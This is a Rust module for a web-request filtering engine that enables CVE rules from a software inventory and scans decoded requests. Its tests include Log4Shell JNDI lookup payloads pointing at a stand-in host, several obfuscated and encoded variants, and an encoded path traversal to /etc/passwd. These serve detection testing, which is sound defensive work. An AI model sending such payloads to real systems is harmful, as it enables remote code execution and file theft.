use crate::sbom::{self, Component};
use aho_corasick::AhoCorasick;
use anyhow::{Context, Result, ensure};
use axum::http::{HeaderMap, HeaderName, Method};
use semver::{Version, VersionReq};
use serde::{Deserialize, Serialize};
use std::{borrow::Cow, collections::HashSet};

#[derive(Clone, Deserialize, Serialize)]
#[serde(tag = "type", rename_all = "snake_case", deny_unknown_fields)]
pub enum Action {
    DenyAll,
    DenyWrite,
    Tokens { patterns: Vec<String> },
    Request { filter: RequestFilter },
}

#[derive(Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct RequestFilter {
    pub methods: Vec<String>,
    pub path_prefix: String,
    pub headers: Vec<HeaderMatch>,
    pub body_patterns: Vec<String>,
}

#[derive(Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct HeaderMatch {
    pub name: String,
    pub value: String,
    pub kind: HeaderMatchKind,
}

#[derive(Clone, Deserialize, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum HeaderMatchKind {
    Exact,
    Token,
    Present,
    MediaType,
}

impl RequestFilter {
    pub(crate) fn validate(&self) -> Result<()> {
        ensure!(
            self.methods.len() <= 8 && self.headers.len() <= 8,
            "too many request selectors"
        );
        ensure!(
            self.methods.iter().all(|m| matches!(
                m.as_str(),
                "GET" | "HEAD" | "POST" | "PUT" | "PATCH" | "DELETE" | "OPTIONS"
            )),
            "unsupported request method"
        );
        ensure!(
            self.path_prefix.len() <= 512
                && self.path_prefix.is_ascii()
                && (self.path_prefix.is_empty() || self.path_prefix.starts_with('/'))
                && !self
                    .path_prefix
                    .bytes()
                    .any(|b| b.is_ascii_control() || b"%\\?#".contains(&b)),
            "invalid path selector"
        );
        ensure!(
            (!self.path_prefix.is_empty() && self.path_prefix != "/")
                || !self.headers.is_empty()
                || !self.body_patterns.is_empty(),
            "request rule must have a narrow selector beyond method alone"
        );
        for header in &self.headers {
            HeaderName::from_bytes(header.name.as_bytes())
                .context("invalid header selector name")?;
            ensure!(
                !matches!(header.kind, HeaderMatchKind::MediaType)
                    || header.name.eq_ignore_ascii_case("content-type"),
                "media_type selectors require Content-Type"
            );
            ensure!(
                header.value.len() <= 256
                    && header.value.is_ascii()
                    && !header.value.bytes().any(|b| b.is_ascii_control()),
                "invalid header selector value"
            );
            ensure!(
                match header.kind {
                    HeaderMatchKind::Present => header.value.is_empty(),
                    _ => !header.value.is_empty(),
                },
                "header selector needs a value, except for presence checks"
            );
            ensure!(
                !matches!(header.kind, HeaderMatchKind::Present)
                    || !matches!(
                        header.name.to_ascii_lowercase().as_str(),
                        "host"
                            | "content-length"
                            | "content-type"
                            | "accept"
                            | "accept-encoding"
                            | "user-agent"
                            | "connection"
                            | "authorization"
                            | "cookie"
                    ),
                "presence of a common header is not a narrow restriction"
            );
            ensure!(
                !header.name.to_ascii_lowercase().starts_with("x-forwarded-")
                    && !matches!(
                        header.name.to_ascii_lowercase().as_str(),
                        "forwarded" | "alt-svc"
                    ),
                "forwarding headers cannot establish transport exposure"
            );
        }
        if !self.body_patterns.is_empty() {
            Action::Tokens {
                patterns: self.body_patterns.clone(),
            }
            .validate()?;
        }
        Ok(())
    }

    fn matches_scope(&self, method: &Method, path: &[u8], headers: &HeaderMap) -> bool {
        (self.methods.is_empty() || self.methods.iter().any(|m| m == method.as_str()))
            && (self.path_prefix.is_empty() || path.starts_with(self.path_prefix.as_bytes()))
            && self.headers.iter().all(|selector| {
                headers
                    .get_all(selector.name.as_str())
                    .iter()
                    .any(|value| match selector.kind {
                        HeaderMatchKind::Present => true,
                        HeaderMatchKind::Exact => value
                            .as_bytes()
                            .eq_ignore_ascii_case(selector.value.as_bytes()),
                        HeaderMatchKind::Token => {
                            value.as_bytes().split(|b| *b == b',').any(|part| {
                                part.trim_ascii()
                                    .eq_ignore_ascii_case(selector.value.as_bytes())
                            })
                        }
                        HeaderMatchKind::MediaType => value
                            .as_bytes()
                            .split(|b| *b == b';')
                            .next()
                            .is_some_and(|part| {
                                part.trim_ascii()
                                    .eq_ignore_ascii_case(selector.value.as_bytes())
                            }),
                    })
            })
    }
}

impl Action {
    pub(crate) fn validate(&self) -> Result<()> {
        if let Self::Request { filter } = self {
            filter.validate()?;
        }
        if let Self::Tokens { patterns } = self {
            ensure!(
                !patterns.is_empty()
                    && patterns.len() <= 64
                    && patterns
                        .iter()
                        .all(|p| !p.is_empty() && p.len() <= 256 && p.is_ascii()),
                "token rules need 1–64 ASCII patterns of 1–256 bytes"
            );
        }
        Ok(())
    }

    pub(crate) fn targeted(&self) -> bool {
        matches!(self, Self::Tokens { .. } | Self::Request { .. })
    }
}

#[derive(Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct RuleSpec {
    pub id: String,
    pub cve: String,
    pub packages: Vec<String>,
    pub affected: Vec<String>,
    pub action: Action,
    pub description: String,
    pub source: String,
}

struct Rule {
    spec: RuleSpec,
    ranges: Vec<VersionReq>,
}

pub struct Catalog {
    rules: Vec<Rule>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct CatalogFile {
    version: u32,
    rules: Vec<RuleSpec>,
}

impl Catalog {
    pub fn parse(bytes: &[u8]) -> Result<Self> {
        ensure!(
            bytes.len() <= sbom::MAX_SBOM_BYTES,
            "catalogue exceeds 64 MiB"
        );
        let file: CatalogFile = serde_json::from_slice(bytes).context("invalid rule catalogue")?;
        ensure!(
            file.version == 1 && !file.rules.is_empty() && file.rules.len() <= 256,
            "expected catalogue version 1 with 1–256 rules"
        );
        let mut ids = HashSet::new();
        let mut rules = Vec::new();
        for mut spec in file.rules {
            ensure!(
                !spec.id.is_empty()
                    && spec.id.len() <= 100
                    && spec
                        .id
                        .bytes()
                        .all(|c| c.is_ascii_alphanumeric() || b"-_.".contains(&c)),
                "invalid rule ID"
            );
            ensure!(ids.insert(spec.id.clone()), "duplicate rule ID");
            ensure!(
                !spec.packages.is_empty() && !spec.affected.is_empty(),
                "rule needs packages and affected ranges"
            );
            ensure!(
                spec.source.starts_with("https://") && spec.cve.starts_with("CVE-"),
                "rule needs a CVE and HTTPS source"
            );
            for package in &mut spec.packages {
                let (identity, version) = sbom::package_identity(package)?;
                ensure!(
                    version.is_none(),
                    "catalogue package IDs must be versionless"
                );
                *package = identity;
            }
            spec.action.validate()?;
            let ranges = spec
                .affected
                .iter()
                .map(|r| VersionReq::parse(r).context("invalid semver range"))
                .collect::<Result<_>>()?;
            rules.push(Rule { spec, ranges });
        }
        Ok(Self { rules })
    }

    pub fn bundled() -> Result<Self> {
        Self::parse(include_bytes!("../rules/default.json"))
    }

    fn coverage(&self, component: Component) -> Coverage {
        let parsed = component.version.as_deref().and_then(version);
        // Unknown and prerelease versions activate matching rules conservatively.
        let uncertain = parsed.as_ref().is_none_or(|v| !v.pre.is_empty());
        let relevant: Vec<_> = self
            .rules
            .iter()
            .filter(|r| {
                component
                    .package
                    .as_ref()
                    .is_some_and(|p| r.spec.packages.contains(p))
            })
            .collect();
        let matched: Vec<_> = relevant
            .iter()
            .filter(|r| {
                uncertain
                    || parsed
                        .as_ref()
                        .is_some_and(|v| r.ranges.iter().any(|range| range.matches(v)))
            })
            .collect();
        let active_rules: Vec<_> = matched
            .iter()
            .filter(|r| r.spec.action.targeted())
            .map(|r| r.spec.id.clone())
            .collect();
        let advisory_rules: Vec<_> = matched
            .iter()
            .filter(|r| !r.spec.action.targeted())
            .map(|r| r.spec.id.clone())
            .collect();
        let status = if relevant.is_empty() {
            "no_catalogue_rule"
        } else if !advisory_rules.is_empty() && active_rules.is_empty() {
            "advisory_only"
        } else if uncertain {
            "unknown_version_rules_enabled"
        } else if active_rules.is_empty() {
            "outside_catalogued_ranges"
        } else {
            "rules_enabled"
        };
        Coverage {
            component,
            status,
            active_rules,
            advisory_rules,
        }
    }

    pub fn specs(&self) -> Vec<&RuleSpec> {
        self.rules.iter().map(|r| &r.spec).collect()
    }
}

#[derive(Clone, Serialize)]
pub struct Coverage {
    #[serde(flatten)]
    pub component: Component,
    pub status: &'static str,
    pub active_rules: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub advisory_rules: Vec<String>,
}

#[derive(Clone, Serialize)]
pub struct Report {
    pub components: Vec<Coverage>,
    pub inventory_gaps: Vec<crate::ai::research::InventoryGap>,
    pub active_rules: Vec<RuleSpec>,
    pub advisory_rules: Vec<RuleSpec>,
    pub generated_rules: Vec<crate::generated::Rule>,
    pub ai: crate::ai::Review,
    pub warning: &'static str,
}

#[derive(Clone)]
pub struct Policy {
    pub report: Report,
    matcher: Option<AhoCorasick>,
    token_rules: Vec<String>,
    request_rules: Vec<(String, RequestFilter, Option<AhoCorasick>)>,
}

fn version(value: &str) -> Option<Version> {
    let value = value.strip_prefix('v').unwrap_or(value);
    let normalized = match value.matches('.').count() {
        0 => format!("{value}.0.0"),
        1 => format!("{value}.0"),
        _ => value.to_owned(),
    };
    Version::parse(&normalized).ok()
}

impl Policy {
    pub fn compile(components: Vec<Component>, catalog: &Catalog) -> Result<Self> {
        let mut activated = HashSet::new();
        let mut advisory = HashSet::new();
        let mut coverage = Vec::new();
        for component in components {
            let item = catalog.coverage(component);
            activated.extend(item.active_rules.iter().cloned());
            advisory.extend(item.advisory_rules.iter().cloned());
            coverage.push(item);
        }
        let active_rules: Vec<_> = catalog
            .rules
            .iter()
            .filter(|r| activated.contains(&r.spec.id))
            .map(|r| r.spec.clone())
            .collect();
        let mut policy = Self {
            report: Report {
                inventory_gaps: crate::ai::research::inventory_gaps(&coverage),
                components: coverage,
                active_rules,
                advisory_rules: catalog
                    .rules
                    .iter()
                    .filter(|r| advisory.contains(&r.spec.id))
                    .map(|r| r.spec.clone())
                    .collect(),
                generated_rules: Vec::new(),
                ai: crate::ai::Review::default(),
                warning: "Targeted rules filter matching requests. Findings without a supported narrow rule remain advisory-only and do not stop unrelated traffic. Full blocking is controlled separately by the traffic-mode API and optional critical-risk automation. AI discovery is non-exhaustive; uncovered findings and inventory gaps require SRE action.",
            },
            matcher: None,
            token_rules: Vec::new(),
            request_rules: Vec::new(),
        };
        policy.rebuild_matcher()?;
        Ok(policy)
    }

    pub(crate) fn add_generated(&mut self, rules: Vec<crate::generated::Rule>) -> Result<()> {
        let mut candidate = self.clone();
        let mut ids: HashSet<_> = candidate
            .report
            .generated_rules
            .iter()
            .map(|r| r.id.clone())
            .collect();
        for rule in rules {
            rule.action.validate()?;
            ensure!(
                rule.action.targeted(),
                "generated rules must target requests; full blocking uses traffic control"
            );
            ensure!(ids.insert(rule.id.clone()), "duplicate generated rule ID");
            candidate.report.generated_rules.push(rule);
        }
        candidate.rebuild_matcher()?;
        *self = candidate;
        Ok(())
    }

    fn rebuild_matcher(&mut self) -> Result<()> {
        let rules = self
            .report
            .active_rules
            .iter()
            .map(|r| (&r.id, &r.action))
            .chain(
                self.report
                    .generated_rules
                    .iter()
                    .map(|r| (&r.id, &r.action)),
            );
        let mut patterns = Vec::new();
        self.token_rules.clear();
        self.request_rules.clear();
        for (id, action) in rules {
            if let Action::Request { filter } = action {
                ensure!(
                    self.request_rules.len() < 128,
                    "too many scoped request rules"
                );
                let matcher = if filter.body_patterns.is_empty() {
                    None
                } else {
                    Some(
                        AhoCorasick::builder()
                            .ascii_case_insensitive(true)
                            .build(&filter.body_patterns)?,
                    )
                };
                self.request_rules
                    .push((id.clone(), filter.clone(), matcher));
            }
            if let Action::Tokens { patterns: tokens } = action {
                for token in tokens {
                    patterns.push(token);
                    self.token_rules.push(id.clone());
                }
            }
        }
        self.matcher = if patterns.is_empty() {
            None
        } else {
            Some(
                AhoCorasick::builder()
                    .ascii_case_insensitive(true)
                    .build(patterns)?,
            )
        };
        Ok(())
    }

    pub fn inspect_request(
        &self,
        method: &Method,
        path: &str,
        headers: &HeaderMap,
        body: &[u8],
    ) -> Option<&str> {
        if self.request_rules.is_empty() {
            return None;
        }
        let paths = decoded_views(path.as_bytes());
        let mut bodies = None;
        for (id, filter, matcher) in &self.request_rules {
            if !paths
                .iter()
                .any(|path| filter.matches_scope(method, path, headers))
            {
                continue;
            }
            let Some(matcher) = matcher else {
                return Some(id);
            };
            if bodies
                .get_or_insert_with(|| decoded_views(body))
                .iter()
                .any(|body| matcher.is_match(body))
            {
                return Some(id);
            }
        }
        None
    }

    fn scan(&self, bytes: &[u8], target: bool) -> Option<&str> {
        if bytes.contains(&0) {
            return Some("nul-byte");
        }
        if target
            && [b"../".as_slice(), b"..\\", b"/.git", b"/.env"]
                .iter()
                .any(|needle| {
                    bytes
                        .windows(needle.len())
                        .any(|w| w.eq_ignore_ascii_case(needle))
                })
        {
            return Some("restricted-target");
        }
        self.matcher
            .as_ref()?
            .find(bytes)
            .map(|m| self.token_rules[m.pattern().as_usize()].as_str())
    }

    /// Raw and decoded views are inspected; the original bytes are always forwarded.
    pub fn inspect_bytes(&self, bytes: &[u8], target: bool) -> Option<&str> {
        if let Some(rule) = self.scan(bytes, target) {
            return Some(rule);
        }
        if !bytes.contains(&b'%') && !bytes.contains(&b'\\') {
            return None;
        }
        let mut current = bytes.to_vec();
        for _ in 0..4 {
            let decoded = decode(&current);
            if decoded == current {
                return None;
            }
            if let Some(rule) = self.scan(&decoded, target) {
                return Some(rule);
            }
            current = decoded;
        }
        (decode(&current) != current).then_some("encoding-depth")
    }
}

fn decoded_views(bytes: &[u8]) -> Vec<Cow<'_, [u8]>> {
    let mut views = vec![Cow::Borrowed(bytes)];
    for _ in 0..4 {
        let Some(previous) = views.last() else { break };
        if !previous.contains(&b'%') && !previous.contains(&b'\\') {
            break;
        }
        let decoded = decode(previous);
        if decoded == previous.as_ref() {
            break;
        }
        views.push(Cow::Owned(decoded));
    }
    views
}

fn hex(byte: u8) -> Option<u32> {
    (byte as char).to_digit(16)
}

fn decode(bytes: &[u8]) -> Vec<u8> {
    // shortcut: only percent/JSON escapes; add application-specific decoding before claiming wider coverage.
    let mut output = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%'
            && let Some(pair) = bytes.get(i + 1..i + 3)
            && let (Some(a), Some(b)) = (hex(pair[0]), hex(pair[1]))
        {
            output.push((a * 16 + b) as u8);
            i += 3;
            continue;
        }
        if bytes[i..].starts_with(b"\\u")
            && let Some(digits) = bytes.get(i + 2..i + 6)
        {
            let code = digits
                .iter()
                .try_fold(0, |value, byte| Some(value * 16 + hex(*byte)?));
            if let Some(character) = code.and_then(char::from_u32) {
                output.extend_from_slice(character.encode_utf8(&mut [0; 4]).as_bytes());
                i += 6;
                continue;
            }
        }
        if bytes[i..].starts_with(b"\\\\") || bytes[i..].starts_with(b"\\/") {
            output.push(bytes[i + 1]);
            i += 2;
            continue;
        }
        output.push(bytes[i]);
        i += 1;
    }
    output
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scoped_filters_and_all_selectors_and_decode_body_and_paths() {
        let filter = RequestFilter {
            methods: vec!["POST".into()],
            path_prefix: "/admin".into(),
            headers: vec![HeaderMatch {
                name: "x-action".into(),
                kind: HeaderMatchKind::Exact,
                value: "upload".into(),
            }],
            body_patterns: vec!["EXPLOIT".into()],
        };
        let mut policy = log4j("2.26.0");
        policy
            .add_generated(vec![crate::generated::Rule {
                id: "test-scoped".into(),
                origin: "ai_discovery",
                package: "pkg:npm/test".into(),
                version: Some("1.0.0".into()),
                basis: "test".into(),
                cves: vec![],
                action: Action::Request {
                    filter: filter.clone(),
                },
                description: "test".into(),
                source: "https://example.invalid/test".into(),
            }])
            .unwrap();
        let mut headers = HeaderMap::new();
        headers.insert("x-action", "UPLOAD".parse().unwrap());
        assert_eq!(
            policy.inspect_request(&Method::POST, "/%61dmin/files", &headers, b"%45XPLOIT"),
            Some("test-scoped")
        );
        for (method, path, body) in [
            (Method::GET, "/admin", b"EXPLOIT".as_slice()),
            (Method::POST, "/other", b"EXPLOIT"),
            (Method::POST, "/admin", b"ordinary"),
        ] {
            assert!(
                policy
                    .inspect_request(&method, path, &headers, body)
                    .is_none()
            );
        }
        assert!(
            policy
                .inspect_request(&Method::POST, "/admin", &HeaderMap::new(), b"EXPLOIT")
                .is_none()
        );
        let mut token = filter;
        token.methods.clear();
        token.path_prefix.clear();
        token.body_patterns.clear();
        token.headers = vec![HeaderMatch {
            name: "content-encoding".into(),
            kind: HeaderMatchKind::Token,
            value: "br".into(),
        }];
        headers.insert("content-encoding", "gzip, BR".parse().unwrap());
        assert!(token.matches_scope(&Method::POST, b"/", &headers));
        headers.insert("content-encoding", "zebra".parse().unwrap());
        assert!(!token.matches_scope(&Method::POST, b"/", &headers));
        token.headers = vec![HeaderMatch {
            name: "content-type".into(),
            kind: HeaderMatchKind::MediaType,
            value: "multipart/form-data".into(),
        }];
        headers.insert(
            "content-type",
            "Multipart/Form-Data; boundary=test".parse().unwrap(),
        );
        assert!(token.matches_scope(&Method::POST, b"/", &headers));
        headers.insert("content-type", "application/json".parse().unwrap());
        assert!(!token.matches_scope(&Method::POST, b"/", &headers));
        token.headers.clear();
        assert!(token.validate().is_err());
        token.headers = vec![HeaderMatch {
            name: "host".into(),
            kind: HeaderMatchKind::Present,
            value: String::new(),
        }];
        assert!(token.validate().is_err());
        token.headers = vec![HeaderMatch {
            name: "x-forwarded-proto".into(),
            kind: HeaderMatchKind::Exact,
            value: "h3".into(),
        }];
        assert!(token.validate().is_err());
    }

    fn log4j(version: &str) -> Policy {
        Policy::compile(
            vec![Component {
                name: "log4j".into(),
                package: Some("pkg:maven/org.apache.logging.log4j/log4j-core".into()),
                version: Some(version.into()),
                kind: None,
                sources: Vec::new(),
            }],
            &Catalog::bundled().unwrap(),
        )
        .unwrap()
    }

    #[test]
    fn log4j_version_boundaries_and_unknown_versions() {
        for version in ["2.0-beta9", "2.3", "2.12.1", "2.14.1", "unknown"] {
            assert_eq!(log4j(version).report.active_rules.len(), 1, "{version}");
        }
        for version in ["1.2.17", "2.3.1", "2.12.2", "2.15.0", "2.26.0"] {
            assert!(log4j(version).report.active_rules.is_empty(), "{version}");
        }
    }

    #[test]
    fn catches_raw_nested_percent_and_json_escaped_lookups() {
        let policy = log4j("2.14.1");
        for bytes in [
            b"${jndi:ldap://example.invalid/x}".as_slice(),
            b"${${lower:j}ndi:x}",
            b"%2524%257Bjndi:x%257D",
            br"\u0024\u007bjndi:x}",
            br"%5Cu0024%7Bjndi:x}",
        ] {
            assert_eq!(
                policy.inspect_bytes(bytes, false),
                Some("log4shell-lookups")
            );
        }
        assert_eq!(policy.inspect_bytes(b"ordinary request", false), None);
        assert_eq!(log4j("2.15.0").inspect_bytes(b"${legitimate}", false), None);
    }

    #[test]
    fn baseline_blocks_encoded_traversal_nuls_and_excessive_nesting() {
        let policy = log4j("2.26.0");
        assert_eq!(
            policy.inspect_bytes(b"/%252e%252e%252fetc/passwd", true),
            Some("restricted-target")
        );
        assert_eq!(policy.inspect_bytes(b"%00", false), Some("nul-byte"));
        assert_eq!(
            policy.inspect_bytes(b"%252525252541", false),
            Some("encoding-depth")
        );
    }

    #[test]
    fn broad_rsc_catalogue_rules_are_advisory_only() {
        for (version, active) in [
            ("19.0.0", true),
            ("19.1.1", true),
            ("19.2.0", true),
            ("19.0.1", false),
            ("19.1.2", false),
            ("19.2.1", false),
        ] {
            let p = Policy::compile(
                vec![Component {
                    name: "RSC".into(),
                    package: Some("pkg:npm/react-server-dom-webpack".into()),
                    version: Some(version.into()),
                    kind: None,
                    sources: Vec::new(),
                }],
                &Catalog::bundled().unwrap(),
            )
            .unwrap();
            assert_eq!(!p.report.advisory_rules.is_empty(), active);
            assert!(
                p.inspect_request(&Method::POST, "/", &HeaderMap::new(), &[])
                    .is_none()
            );
            assert!(
                p.inspect_request(&Method::GET, "/", &HeaderMap::new(), &[])
                    .is_none()
            );
        }
    }

    #[test]
    fn validates_catalogue_and_enables_custom_rules() {
        let bytes = br#"{"version":1,"rules":[{"id":"emergency","cve":"CVE-2026-0000","packages":["pkg:npm/example"],"affected":["<2.0.0"],"action":{"type":"deny_all"},"description":"Example only","source":"https://example.invalid/advisory"}]}"#;
        let catalog = Catalog::parse(bytes).unwrap();
        let p = Policy::compile(
            vec![Component {
                name: "example".into(),
                package: Some("pkg:npm/example".into()),
                version: None,
                kind: None,
                sources: Vec::new(),
            }],
            &catalog,
        )
        .unwrap();
        assert_eq!(
            p.inspect_request(&Method::GET, "/", &HeaderMap::new(), &[]),
            None
        );
        assert_eq!(p.report.components[0].status, "advisory_only");
        assert!(Catalog::parse(br#"{"version":2,"rules":[]}"#).is_err());
    }
}
